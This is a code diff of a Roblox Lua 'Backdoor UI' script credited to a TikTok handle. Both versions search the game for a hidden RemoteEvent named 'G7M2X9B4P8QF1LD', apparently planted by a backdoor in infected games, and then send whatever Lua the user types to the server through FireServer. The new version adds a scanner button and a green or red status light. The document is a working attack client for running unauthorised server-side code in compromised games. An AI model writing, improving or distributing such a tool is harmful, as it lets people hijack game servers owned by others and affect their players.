@@ -1,253 +1,302 @@
+-- Backdoor UI Script (toggle always visible + execute sends)
+
+-- Instances:
+local Converted = {
+    ["_backdoorui"] = Instance.new("ScreenGui");
+    ["_main"] = Instance.new("Frame");
+    ["_UICorner"] = Instance.new("UICorner");
+    ["_UIStroke"] = Instance.new("UIStroke");
+    ["_TextLabel"] = Instance.new("TextLabel");
+    ["_CircleFrame"] = Instance.new("Frame");
+    ["_UICorner1"] = Instance.new("UICorner");
+    ["_UIStroke1"] = Instance.new("UIStroke");
+    ["_textBox"] = Instance.new("TextBox");
+    ["_UICorner2"] = Instance.new("UICorner");
+    ["_UIStroke2"] = Instance.new("UIStroke");
+    ["_ImageLabel"] = Instance.new("ImageLabel");
+    ["_execute"] = Instance.new("TextButton");
+    ["_UIStroke3"] = Instance.new("UIStroke");
+    ["_UICorner3"] = Instance.new("UICorner");
+    ["_clear"] = Instance.new("TextButton");
+    ["_UIStroke4"] = Instance.new("UIStroke");
+    ["_UICorner4"] = Instance.new("UICorner");
+    ["_inject"] = Instance.new("ImageButton");
+    ["_UICorner5"] = Instance.new("UICorner");
+    ["_UIStroke5"] = Instance.new("UIStroke");
+    ["_toggle"] = Instance.new("ImageButton");  -- toggle button
+}
+
+-- Properties:
+Converted["_backdoorui"].ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+Converted["_backdoorui"].Name = "backdoorui"
+
+Converted["_main"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Converted["_main"].BorderColor3 = Color3.fromRGB(0, 0, 0)
+Converted["_main"].BorderSizePixel = 2
+Converted["_main"].Position = UDim2.new(0.2716, 0, 0.2507, 0)
+Converted["_main"].Size = UDim2.new(0, 543, 0, 341)
+Converted["_main"].Name = "main"
+
+Converted["_UICorner"].CornerRadius = UDim.new(0, 2)
+Converted["_TextLabel"].Font = Enum.Font.RobotoMono
+Converted["_TextLabel"].Text = "@vinchiqqq SS"
+Converted["_TextLabel"].TextColor3 = Color3.fromRGB(0, 0, 0)
+Converted["_TextLabel"].TextSize = 14
+Converted["_TextLabel"].BackgroundTransparency = 1
+Converted["_TextLabel"].Size = UDim2.new(0, 200, 0, 50)
+
+Converted["_CircleFrame"].AnchorPoint = Vector2.new(0.5, 0.5)
+Converted["_CircleFrame"].BackgroundColor3 = Color3.fromRGB(255, 0, 0) -- default red
+Converted["_CircleFrame"].Position = UDim2.new(1.061, -50, 0.191, -50)
+Converted["_CircleFrame"].Size = UDim2.new(0, 15, 0, 15)
+Converted["_CircleFrame"].Name = "CircleFrame"
+
+Converted["_UICorner1"].CornerRadius = UDim.new(1, 0)
+
+Converted["_textBox"].Font = Enum.Font.SourceSans
+Converted["_textBox"].MultiLine = true
+Converted["_textBox"].Text = "-- coding bla bla bla"
+Converted["_textBox"].TextColor3 = Color3.fromRGB(0, 0, 0)
+Converted["_textBox"].TextSize = 14
+Converted["_textBox"].TextWrapped = true
+Converted["_textBox"].TextXAlignment = Enum.TextXAlignment.Left
+Converted["_textBox"].TextYAlignment = Enum.TextYAlignment.Top
+Converted["_textBox"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Converted["_textBox"].Position = UDim2.new(0.026, 0, 0.176, 0)
+Converted["_textBox"].Size = UDim2.new(0, 512, 0, 193)
+Converted["_textBox"].Name = "textBox"
+
+Converted["_UICorner2"].CornerRadius = UDim.new(0, 2)
+Converted["_UIStroke2"].ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+
+Converted["_ImageLabel"].Image = "rbxassetid://78976970"
+Converted["_ImageLabel"].BackgroundTransparency = 1
+Converted["_ImageLabel"].Position = UDim2.new(0.013, 0, 0.023, 0)
+Converted["_ImageLabel"].Size = UDim2.new(0, 32, 0, 32)
+
+Converted["_execute"].Font = Enum.Font.SourceSans
+Converted["_execute"].Text = "Execute"
+Converted["_execute"].TextColor3 = Color3.fromRGB(0, 0, 0)
+Converted["_execute"].TextSize = 14
+Converted["_execute"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Converted["_execute"].Position = UDim2.new(0.072, 0, 0.818, 0)
+Converted["_execute"].Size = UDim2.new(0, 186, 0, 46)
+Converted["_execute"].Name = "execute"
+
+Converted["_UIStroke3"].ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+Converted["_UICorner3"].CornerRadius = UDim.new(0, 4)
+
+Converted["_clear"].Font = Enum.Font.SourceSans
+Converted["_clear"].Text = "Clear"
+Converted["_clear"].TextColor3 = Color3.fromRGB(0, 0, 0)
+Converted["_clear"].TextSize = 14
+Converted["_clear"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Converted["_clear"].Position = UDim2.new(0.532, 0, 0.818, 0)
+Converted["_clear"].Size = UDim2.new(0, 186, 0, 46)
+Converted["_clear"].Name = "clear"
+
+Converted["_UIStroke4"].ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+Converted["_UICorner4"].CornerRadius = UDim.new(0, 4)
+
+Converted["_inject"].Image = "rbxassetid://6187009322"
+Converted["_inject"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Converted["_inject"].Position = UDim2.new(0.904, 0, 0.852, 0)
+Converted["_inject"].Size = UDim2.new(0, 34, 0, 34)
+Converted["_inject"].Name = "inject"
+
+Converted["_UICorner5"].CornerRadius = UDim.new(0, 4)
+Converted["_UIStroke5"].ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+
+-- Toggle ImageButton
+Converted["_toggle"].Name = "toggleUIbutton"
+Converted["_toggle"].Image = "rbxassetid://10511856020"  -- sample toggle icon
+Converted["_toggle"].BackgroundColor3 = Color3.fromRGB(200, 200, 200)
+Converted["_toggle"].BorderColor3 = Color3.fromRGB(0, 0, 0)
+Converted["_toggle"].BorderSizePixel = 1
+Converted["_toggle"].Size = UDim2.new(0, 30, 0, 30)
+Converted["_toggle"].Position = UDim2.new(0, 0, 0, 0)
+Converted["_toggle"].AnchorPoint = Vector2.new(0, 0)
+Converted["_toggle"].ZIndex = 50
+
+-- Services
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local StarterGui = game:GetService("StarterGui")
+local RunService = game:GetService("RunService")
 local UserInputService = game:GetService("UserInputService")
-
 local player = Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
 
-local function notify(title, text, duration)
-    StarterGui:SetCore("SendNotification", {
-        Title = title;
-        Text = text;
-        Duration = duration or 4;
-    })
-end
+-- Parent to PlayerGui
+Converted["_backdoorui"].Parent = playerGui
 
-local screenGui = Instance.new("ScreenGui")
-screenGui.Name = "BackdoorGUI"
-screenGui.Parent = player:WaitForChild("PlayerGui")
+-- Parent UI hierarchy
+Converted["_main"].Parent = Converted["_backdoorui"]
+Converted["_UICorner"].Parent = Converted["_main"]
+Converted["_UIStroke"].Parent = Converted["_main"]
+Converted["_TextLabel"].Parent = Converted["_main"]
+Converted["_CircleFrame"].Parent = Converted["_main"]
+Converted["_UICorner1"].Parent = Converted["_CircleFrame"]
+Converted["_UIStroke1"].Parent = Converted["_CircleFrame"]
+Converted["_textBox"].Parent = Converted["_main"]
+Converted["_UICorner2"].Parent = Converted["_textBox"]
+Converted["_UIStroke2"].Parent = Converted["_textBox"]
+Converted["_ImageLabel"].Parent = Converted["_main"]
+Converted["_execute"].Parent = Converted["_main"]
+Converted["_UIStroke3"].Parent = Converted["_execute"]
+Converted["_UICorner3"].Parent = Converted["_execute"]
+Converted["_clear"].Parent = Converted["_main"]
+Converted["_UIStroke4"].Parent = Converted["_clear"]
+Converted["_UICorner4"].Parent = Converted["_clear"]
+Converted["_inject"].Parent = Converted["_main"]
+Converted["_UICorner5"].Parent = Converted["_inject"]
+Converted["_UIStroke5"].Parent = Converted["_inject"]
+-- Toggle button parented outside main
+Converted["_toggle"].Parent = playerGui
 
-local toggleButton = Instance.new("ImageButton")
-toggleButton.Name = "ToggleButton"
-toggleButton.Size = UDim2.new(0, 30, 0, 30)
-toggleButton.Position = UDim2.new(0, 10, 0, 10)
-toggleButton.BackgroundTransparency = 1
-toggleButton.Image = "rbxassetid://6031091002"
-toggleButton.Parent = screenGui
+-- For storing the detected remote event reference
+local detectedRemote = nil
 
-local clickSound = Instance.new("Sound")
-clickSound.Name = "ClickSound"
-clickSound.SoundId = "rbxassetid://87437544236708"
-clickSound.Volume = 0.7
-clickSound.Parent = toggleButton
+print("Backdoor UI running for:", player.Name)
 
-local watermark = Instance.new("TextLabel")
-watermark.Name = "Watermark"
-watermark.Size = UDim2.new(0, 250, 0, 20)
-watermark.Position = UDim2.new(0, 10, 1, -30)
-watermark.BackgroundTransparency = 1
-watermark.Text = "Made by @vinchiqqq on TikTok"
-watermark.TextColor3 = Color3.new(1, 1, 1)
-watermark.TextTransparency = 0.8
-watermark.Font = Enum.Font.SourceSans
-watermark.TextSize = 14
-watermark.TextXAlignment = Enum.TextXAlignment.Left
-watermark.TextYAlignment = Enum.TextYAlignment.Bottom
-watermark.Parent = screenGui
-
-local guiContainer = Instance.new("Frame")
-guiContainer.Name = "GUIContainer"
-guiContainer.Size = UDim2.new(1, 0, 1, 0)
-guiContainer.BackgroundTransparency = 1
-guiContainer.Parent = screenGui
-
-local function createOutlineFrame(size, position, parent, cornerRadius)
-    local outline = Instance.new("Frame")
-    outline.Size = size
-    outline.Position = position
-    outline.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-    outline.BorderSizePixel = 0
-    outline.Parent = parent
-
-    local outlineCorner = Instance.new("UICorner")
-    outlineCorner.CornerRadius = cornerRadius or UDim.new(0, 10)
-    outlineCorner.Parent = outline
-
-    return outline
-end
-
-local titleOutline = createOutlineFrame(UDim2.new(0, 400, 0, 40), UDim2.new(0.5, -200, 0.5, -175), guiContainer, UDim.new(0, 10))
-local titleBar = Instance.new("Frame")
-titleBar.Name = "TitleBar"
-titleBar.Size = UDim2.new(1, -4, 1, -4)
-titleBar.Position = UDim2.new(0, 2, 0, 2)
-titleBar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-titleBar.BorderSizePixel = 0
-titleBar.Parent = titleOutline
-
-local titleCorner = Instance.new("UICorner")
-titleCorner.CornerRadius = UDim.new(0, 10)
-titleCorner.Parent = titleBar
-
-local titleLabel = Instance.new("TextLabel")
-titleLabel.Name = "TitleLabel"
-titleLabel.Size = UDim2.new(1, 0, 1, 0)
-titleLabel.BackgroundTransparency = 1
-titleLabel.Text = "@vinchiqqq SS"
-titleLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
-titleLabel.Font = Enum.Font.SourceSansBold
-titleLabel.TextSize = 24
-titleLabel.Parent = titleBar
-
-local frameOutline = createOutlineFrame(UDim2.new(0, 400, 0, 250), UDim2.new(0.5, -200, 0.5, -125), guiContainer, UDim.new(0, 10))
-local frame = Instance.new("Frame")
-frame.Name = "MainFrame"
-frame.Size = UDim2.new(1, -4, 1, -4)
-frame.Position = UDim2.new(0, 2, 0, 2)
-frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-frame.BorderSizePixel = 0
-frame.Parent = frameOutline
-
-local frameCorner = Instance.new("UICorner")
-frameCorner.CornerRadius = UDim.new(0, 10)
-frameCorner.Parent = frame
-
-local textboxOutline = createOutlineFrame(UDim2.new(1, -20, 0, 150), UDim2.new(0, 10, 0, 10), frame, UDim.new(0, 8))
-local textbox = Instance.new("TextBox")
-textbox.Name = "CodeBox"
-textbox.Size = UDim2.new(1, -4, 1, -4)
-textbox.Position = UDim2.new(0, 2, 0, 2)
-textbox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-textbox.BorderSizePixel = 0
-textbox.TextColor3 = Color3.fromRGB(0, 0, 0)
-textbox.Font = Enum.Font.SourceSans
-textbox.TextSize = 18
-textbox.TextWrapped = true
-textbox.ClearTextOnFocus = false
-textbox.MultiLine = true
-textbox.Text = "-- Type your script here"
-textbox.Parent = textboxOutline
-
-local textboxCorner = Instance.new("UICorner")
-textboxCorner.CornerRadius = UDim.new(0, 8)
-textboxCorner.Parent = textbox
-
-local buttonsFrame = Instance.new("Frame")
-buttonsFrame.Name = "ButtonsFrame"
-buttonsFrame.Size = UDim2.new(1, -20, 0, 50)
-buttonsFrame.Position = UDim2.new(0, 10, 1, -60)
-buttonsFrame.BackgroundTransparency = 1
-buttonsFrame.Parent = frame
-
-local function createButton(name, text, position)
-    local btnOutline = Instance.new("Frame")
-    btnOutline.Name = name .. "Outline"
-    btnOutline.Size = UDim2.new(0, 120, 1, 0)
-    btnOutline.Position = position
-    btnOutline.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-    btnOutline.BorderSizePixel = 0
-    btnOutline.Parent = buttonsFrame
-
-    local outlineCorner = Instance.new("UICorner")
-    outlineCorner.CornerRadius = UDim.new(0, 8)
-    outlineCorner.Parent = btnOutline
-
-    local btn = Instance.new("TextButton")
-    btn.Name = name
-    btn.Size = UDim2.new(1, -4, 1, -4)
-    btn.Position = UDim2.new(0, 2, 0, 2)
-    btn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-    btn.BorderSizePixel = 0
-    btn.Text = text
-    btn.TextColor3 = Color3.fromRGB(0, 0, 0)
-    btn.Font = Enum.Font.SourceSansBold
-    btn.TextSize = 20
-    btn.Parent = btnOutline
-
-    local btnCorner = Instance.new("UICorner")
-    btnCorner.CornerRadius = UDim.new(0, 8)
-    btnCorner.Parent = btn
-
-    return btn
-end
-
-local btnExecute = createButton("Execute", "Execute", UDim2.new(0, 0, 0, 0))
-local btnClear = createButton("Clear", "Clear", UDim2.new(0, 130, 0, 0))
-local btnCheck = createButton("Check", "Check", UDim2.new(0, 260, 0, 0))
-
-local function getInfectedRemote()
-    return ReplicatedStorage:FindFirstChild("G7M2X9B4P8QF1LD")
-end
-
-btnClear.MouseButton1Click:Connect(function()
-    textbox.Text = ""
-end)
-
-btnCheck.MouseButton1Click:Connect(function()
-    local remote = getInfectedRemote()
-    local timeChecked = os.date("%X") -- current time as HH:MM:SS
-    if remote and remote:IsA("RemoteEvent") then
-        notify("Backdoor Check", "Remote 'G7M2X9B4P8QF1LD' found! Checked at: " .. timeChecked)
-    else
-        notify("Backdoor Check", "Remote 'G7M2X9B4P8QF1LD' NOT found! Checked at: " .. timeChecked)
-    end
-end)
-
-btnExecute.MouseButton1Click:Connect(function()
-    local remote = getInfectedRemote()
-    if remote and remote:IsA("RemoteEvent") then
-        local success, err = pcall(function()
-            remote:FireServer(textbox.Text)
-        end)
-        if success then
-            notify("Execute", "Script sent successfully.")
-        else
-            notify("Execute", "Failed to send script: " .. tostring(err))
-        end
-    else
-        notify("Execute", "RemoteEvent 'G7M2X9B4P8QF1LD' not found.")
-    end
-end)
-
--- Dragging support for frameOutline and titleOutline
-local dragging, dragInput, dragStart, startPos
-
-local function update(input)
-    local delta = input.Position - dragStart
-    frameOutline.Position = UDim2.new(
-        startPos.X.Scale,
-        startPos.X.Offset + delta.X,
-        startPos.Y.Scale,
-        startPos.Y.Offset + delta.Y
-    )
-    titleOutline.Position = UDim2.new(
-        startPos.X.Scale,
-        startPos.X.Offset + delta.X,
-        startPos.Y.Scale,
-        startPos.Y.Offset + delta.Y - 50
-    )
-end
-
-frameOutline.InputBegan:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
-        dragging = true
-        dragStart = input.Position
-        startPos = frameOutline.Position
-
-        input.Changed:Connect(function()
-            if input.UserInputState == Enum.UserInputState.End then
-                dragging = false
+-- Spin image
+do
+    local img = Converted["_ImageLabel"]
+    if img then
+        local rotation = 0
+        RunService.RenderStepped:Connect(function(dt)
+            rotation = (rotation + 180 * dt) % 360
+            if img and img.Parent then
+                img.Rotation = rotation
             end
         end)
     end
-end)
+end
 
-frameOutline.InputChanged:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
-        dragInput = input
+-- Clear button
+do
+    local clearButton = Converted["_clear"]
+    local textBox = Converted["_textBox"]
+    if clearButton then
+        clearButton.MouseButton1Click:Connect(function()
+            if textBox then
+                textBox.Text = ""
+            end
+        end)
     end
-end)
+end
 
-UserInputService.InputChanged:Connect(function(input)
-    if input == dragInput and dragging then
-        update(input)
+-- Execute button: send text to detected remote if scanned
+do
+    local execButton = Converted["_execute"]
+    local textBox = Converted["_textBox"]
+    if execButton then
+        execButton.MouseButton1Click:Connect(function()
+            if detectedRemote and detectedRemote:IsA("RemoteEvent") then
+                detectedRemote:FireServer(textBox.Text or "")
+            else
+                local ok, err = pcall(function()
+                    game:GetService("StarterGui"):SetCore("SendNotification", {
+                        Title = "Backdoor Execute",
+                        Text = "No remote scanned yet!",
+                        Duration = 4
+                    })
+                end)
+                if not ok then warn("Notification error:", err) end
+            end
+        end)
     end
-end)
+end
 
--- Toggle GUI visibility with click sound
-local visible = true
-toggleButton.MouseButton1Click:Connect(function()
-    clickSound:Play()
-    visible = not visible
-    guiContainer.Visible = visible
-end)
+-- Inject button scan logic
+do
+    local injectButton = Converted["_inject"]
+    local circle = Converted["_CircleFrame"]
+
+    if injectButton then
+        injectButton.MouseButton1Click:Connect(function()
+            local found = ReplicatedStorage:FindFirstChild("G7M2X9B4P8QF1LD", true)
+                or Players:FindFirstChild("G7M2X9B4P8QF1LD", true)
+                or workspace:FindFirstChild("G7M2X9B4P8QF1LD", true)
+                or playerGui:FindFirstChild("G7M2X9B4P8QF1LD", true)
+                or game.Lighting:FindFirstChild("G7M2X9B4P8QF1LD", true)
+                or game:FindService("ReplicatedFirst"):FindFirstChild("G7M2X9B4P8QF1LD", true)
+                or game:GetService("CoreGui"):FindFirstChild("G7M2X9B4P8QF1LD", true)
+
+            local msg, color
+            local checkTime = os.date("%X")
+
+            if found and found:IsA("RemoteEvent") then
+                detectedRemote = found
+                msg = "Backdoor found!\nCheck time: " .. checkTime
+                color = Color3.fromRGB(0, 255, 0)
+            else
+                detectedRemote = nil
+                msg = "Backdoor not found :(\nCheck time: " .. checkTime
+                color = Color3.fromRGB(255, 0, 0)
+            end
+
+            if circle then
+                circle.BackgroundColor3 = color
+                circle.BackgroundTransparency = 0
+            end
+
+            local ok, err = pcall(function()
+                game:GetService("StarterGui"):SetCore("SendNotification", {
+                    Title = "Backdoor Scanner",
+                    Text = msg,
+                    Duration = 5
+                })
+            end)
+            if not ok then
+                warn("SendNotification error:", err)
+            end
+        end)
+    end
+end
+
+-- Toggle always visible (only main)
+do
+    local toggleBtn = Converted["_toggle"]
+    local mainFrame = Converted["_main"]
+    if toggleBtn and mainFrame then
+        toggleBtn.MouseButton1Click:Connect(function()
+            mainFrame.Visible = not mainFrame.Visible
+        end)
+    end
+end
+
+-- Draggable main frame
+do
+    local frame = Converted["_main"]
+    if frame then
+        frame.Active = true
+        frame.Selectable = true
+
+        local dragging, dragStart, startPos
+
+        frame.InputBegan:Connect(function(input)
+            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+                dragging = true
+                dragStart = input.Position
+                startPos = frame.Position
+                input.Changed:Connect(function()
+                    if input.UserInputState == Enum.UserInputState.End then
+                        dragging = false
+                    end
+                end)
+            end
+        end)
+
+        UserInputService.InputChanged:Connect(function(input)
+            if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
+                local delta = input.Position - dragStart
+                frame.Position = UDim2.new(
+                    startPos.X.Scale,
+                    startPos.X.Offset + delta.X,
+                    startPos.Y.Scale,
+                    startPos.Y.Offset + delta.Y
+                )
+            end
+        end)
+    end
+end
